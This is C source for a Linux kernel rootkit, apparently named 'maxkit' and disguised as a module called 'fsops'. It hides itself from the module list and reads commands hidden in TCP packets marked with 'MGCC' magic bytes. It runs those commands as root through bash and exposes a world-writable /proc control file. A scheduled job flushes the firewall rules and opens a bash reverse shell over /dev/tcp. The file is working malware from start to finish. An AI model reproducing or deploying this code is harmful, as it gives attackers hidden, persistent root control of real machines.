#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/timer.h>
#include <linux/jiffies.h>
#include <linux/ftrace.h>
#include <linux/unistd.h>
#include <linux/ptrace.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/delay.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/workqueue.h>
#include <linux/proc_fs.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

#define DELAY_MS (100 * 1000)
#define LOG_K(level, msg, ...) printk(level "fsops: " msg "\n", ##__VA_ARGS__)
#define MAGIC_BYTES "MGCC"
#define MAGIC_BYTES_SIZE 4

struct nfcc_cmd_work_struct {
    struct work_struct nfcc_work;
    char nfcc_cmd[256];
};

static void                         nfcc_run_command(struct work_struct *work);
static ssize_t                      proc_write(struct file *file,
                                               const char __user *buffer, 
                                               size_t len, 
                                               loff_t *offset);
static void                         run_user_command(char *command);
static void                         sc_run_commands(struct work_struct *work);
static unsigned int                 hook_in_fun(void *priv,
                                                struct sk_buff *skb,
                                                const struct nf_hook_state *state);

static struct proc_dir_entry       *proc_file;
static struct delayed_work          sc_delayed_work;
static struct list_head            *prev_module;
static struct nf_hook_ops           netfilter_bypass_in;
static struct workqueue_struct     *nfcc_wq;
static const struct proc_ops        proc_fops = { .proc_write = proc_write };
static char                         proc_buffer[256];
static unsigned long                proc_buffer_size = 0;
static bool                         debug_enabled = 1;
static bool                         sc_enabled = 0;

MODULE_LICENSE      ("GPL");
MODULE_AUTHOR       ("Max Friedland <mxfriedland@proton.me>");
MODULE_DESCRIPTION  ("Kmod stager for embedded payload.");

// Helper function for hiding the module
void hide_module(void) 
{
    if (debug_enabled) LOG_K(KERN_INFO, "hiding module");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

// Helper function for showing the module
void show_module(void)
{
    if (debug_enabled) LOG_K(KERN_INFO, "showing module");
    list_add(&THIS_MODULE->list, prev_module);
}

// Helper function for showing debug
void show_debug(void)
{
    debug_enabled = 1;
    if (debug_enabled) LOG_K(KERN_INFO, "debug enabled");
}

// Helper function for hiding debug 
void hide_debug(void)
{
    if (debug_enabled) LOG_K(KERN_INFO, "debug disabled");
    debug_enabled = 0;
}

// Helper function for enabling scheduled commands
void enable_sc(void)
{
    if (debug_enabled) LOG_K(KERN_INFO, "enabled scheduled commands");
    sc_enabled = 1;
}

// Helper function for disabling scheduled commands
void disable_sc(void)
{
    if (debug_enabled) LOG_K(KERN_INFO, "disabled scheduled commands");
    sc_enabled = 0;
}

static int execute_maxkit_command(char *command)
{
    if (strncmp(command, "hidemod", 9) == 0)
        hide_module();
    else if (strncmp(command, "showmod", 11) == 0)
        show_module();
    else if (strncmp(command, "enabledebug", 11) == 0)
        show_debug();
    else if (strncmp(command, "disabledebug", 12) == 0)
        hide_debug();
    else if (strncmp(command, "enablesc", 8) == 0)
        enable_sc();
    else if (strncmp(command, "disablesc", 12) == 0)
        disable_sc();
    else
        return 1;
    return 0;
}

// Execute commands from NFCC WQ
static void nfcc_run_command(struct work_struct *work)
{
    struct nfcc_cmd_work_struct *this_nfcc_cmd_work = container_of(work, struct nfcc_cmd_work_struct, nfcc_work);
    if (execute_maxkit_command(this_nfcc_cmd_work->nfcc_cmd) == 1)
        run_user_command(this_nfcc_cmd_work->nfcc_cmd);

    kfree(this_nfcc_cmd_work);
}

// Reading the proc file
static ssize_t proc_write(struct file *file,
                          const char __user *buffer, 
                          size_t len, 
                          loff_t *offset)
{
    if (len > sizeof(proc_buffer) - 1) {
        return -EINVAL;
    }

    if (copy_from_user(proc_buffer, buffer, len)) {
        return -EFAULT;
    }

    proc_buffer[len] = '\0';
    proc_buffer_size = len;

    execute_maxkit_command(proc_buffer);

    return len;
}

// Running commands in user space
static void run_user_command(char *command)
{
    char *argv[] = {
        "/bin/bash",
        "-c",
        command,
        NULL
    };

    char *envp[] = {
        "HOME=/root",
        "USER=root",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };

    if (debug_enabled) LOG_K(KERN_INFO, "running %s", command);

    int result = call_usermodehelper(argv[0], 
                                     argv, 
                                     envp, 
                                     UMH_WAIT_EXEC);

    if (debug_enabled) LOG_K(KERN_INFO, "%s returned %d", command, result);
}

// Scheduling actions
static void sc_run_commands(struct work_struct *work)
{
    if (debug_enabled) LOG_K(KERN_INFO, "starting scheduled commands");
    if (sc_enabled) {
        run_user_command("nftables flush ruleset");
        run_user_command("p=$((8000 + $(date +%s) / 600 % 100)); bash -i >& /dev/tcp/127.0.0.1/$p 0>&1");
    }
    
    schedule_delayed_work(&sc_delayed_work, msecs_to_jiffies(DELAY_MS));
}

// Netfilter hook
static unsigned int hook_in_fun(void *priv,
                                struct sk_buff *skb,
                                const struct nf_hook_state *state)
{
    struct iphdr   *ip_header;

    ip_header = ip_hdr(skb);
    if (!ip_header) return NF_ACCEPT;

    if (ip_header->protocol == IPPROTO_TCP) {
        struct tcphdr  *tcp_header;
        unsigned char *pkt_data;
        int pkt_data_len;

        tcp_header = tcp_hdr(skb);
        pkt_data = (unsigned char *)((unsigned char *)tcp_header + (tcp_header->doff * 4));
        pkt_data_len = skb->len - (ip_header->ihl * 4) - (tcp_header->doff * 4) - MAGIC_BYTES_SIZE;

        if (pkt_data_len > 0 &&
            pkt_data_len < 300 && 
            strncmp(pkt_data, MAGIC_BYTES, MAGIC_BYTES_SIZE) == 0) {
                struct nfcc_cmd_work_struct *this_nfcc_cmd_work;

                this_nfcc_cmd_work = kmalloc(sizeof(struct nfcc_cmd_work_struct), GFP_ATOMIC);
                if (!this_nfcc_cmd_work) {
                    if (debug_enabled) LOG_K(KERN_ERR, "failed to kmalloc nfcc_cmd_work_struct");
                    return NF_DROP;
                }

                INIT_WORK(&this_nfcc_cmd_work->nfcc_work, nfcc_run_command);

                if (pkt_data_len > sizeof(this_nfcc_cmd_work->nfcc_cmd) - 1) {
                    pkt_data_len = sizeof(this_nfcc_cmd_work->nfcc_cmd) - 1;
                }
                memcpy(this_nfcc_cmd_work->nfcc_cmd, pkt_data + MAGIC_BYTES_SIZE, pkt_data_len);
                this_nfcc_cmd_work->nfcc_cmd[pkt_data_len] = '\0';

                if  (nfcc_wq)
                    queue_work(nfcc_wq, &this_nfcc_cmd_work->nfcc_work);
                else {
                    if (debug_enabled) LOG_K(KERN_ERR, "nfcc_wq not initialized");
                    kfree(this_nfcc_cmd_work);
                }
                return NF_DROP;
        }
    }

    return NF_ACCEPT;
}

static int __init fsops_init(void) 
{
    if (debug_enabled) LOG_K(KERN_INFO, "loading maxkit");

    //hide_module();

    nfcc_wq = create_singlethread_workqueue("the_command_work_struct");
    if (!nfcc_wq) {
        if (debug_enabled) LOG_K(KERN_ERR, "couldnt create wk");
        return -ENOMEM;
    }

    // setup netfilter hook
    netfilter_bypass_in.hook = hook_in_fun;
    netfilter_bypass_in.pf = PF_INET;
    netfilter_bypass_in.hooknum = NF_INET_PRE_ROUTING;
    netfilter_bypass_in.priority = NF_IP_PRI_FIRST;

    nf_register_net_hook(&init_net, &netfilter_bypass_in);

    // proc file
    proc_file = proc_create("fsops", 0666, NULL, &proc_fops);
    if (!proc_file) {
        if (debug_enabled) LOG_K(KERN_ERR, "failed to create proc");
        return -ENOMEM;
    }

    // scheduled commands
    INIT_DELAYED_WORK(&sc_delayed_work, sc_run_commands);
    schedule_delayed_work(&sc_delayed_work, msecs_to_jiffies(1));
    if (debug_enabled) LOG_K(KERN_INFO, "finished init");
    return 0;
}

static void __exit fsops_exit(void)
{
    if (debug_enabled) LOG_K(KERN_INFO, "unloading maxkit");
    flush_workqueue(nfcc_wq);
    destroy_workqueue(nfcc_wq);
    nf_unregister_net_hook(&init_net, &netfilter_bypass_in);
    cancel_delayed_work_sync(&sc_delayed_work);
    proc_remove(proc_file);
}

module_init(fsops_init);
module_exit(fsops_exit);